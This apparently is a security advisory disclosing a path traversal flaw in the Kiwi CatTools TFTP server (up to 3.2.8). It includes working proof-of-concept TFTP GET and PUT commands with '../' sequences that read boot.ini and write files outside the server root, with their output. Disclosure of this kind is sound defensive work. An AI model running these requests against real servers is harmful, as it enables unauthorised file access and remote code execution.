Subject: Kiwi CatTools TFTP server path traversal

Path traversal security vulnerability in Kiwi CatTools TFTP up to 3.2.8
server can lead to information disclosure and remote code execution

Risk: High

DISCUSSION


Kiwi CatTools TFTP server doesn't properly verify filename in PUT and GET
request which can be used to download/upload any file from/to server.
Default setting allows replacing of existing files. Such settings lead to
probability to replace an executable files and run code on attacker choice. 

EXAMPLES

C:\>tftp -i 10.1.1.2 GET /x/../../../../../boot.ini boot.txt

Transfer successful: 212 bytes in 1 second, 212 bytes/s

C:\>type boot.txt

[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS

C:\>tftp -i 10.1.1.2 PUT boot.txt /x/../../../../../pttest.txt

Transfer successful: 212 bytes in 1 second, 212 bytes/s

C:\>type pttest.txt

[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
